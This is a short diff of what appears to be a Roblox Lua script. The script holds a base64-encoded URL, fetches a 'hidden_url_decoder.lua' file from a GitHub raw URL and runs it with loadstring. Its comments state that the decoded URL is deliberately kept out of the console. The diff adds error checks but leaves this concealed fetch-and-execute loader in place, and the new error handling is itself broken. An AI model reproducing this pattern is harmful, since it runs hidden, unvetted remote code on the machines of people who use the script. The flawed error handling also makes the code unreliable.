@@ -143,9 +143,9 @@ local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvR2FiZUJvYTIvcmVm
 local urlDecoderScript = game:HttpGet("https://raw.githubusercontent.com/Melharper/GabeBoa2/refs/heads/main/hidden_url_decoder.lua")
 
 -- Check if the urlDecoderScript was fetched successfully
-if urlDecoderScript then
+if urlDecoderScript and urlDecoderScript ~= "" then
     -- Execute the URL decoder script
-    local decodedUrl = loadstring(urlDecoderScript)()
+    local decodedUrl, err = loadstring(urlDecoderScript)() -- Now checking for errors when loading the URL
 
     -- Don't print the decoded URL to console
     -- print("Decoded URL:", decodedUrl)  -- Commented out to avoid showing the URL in the console
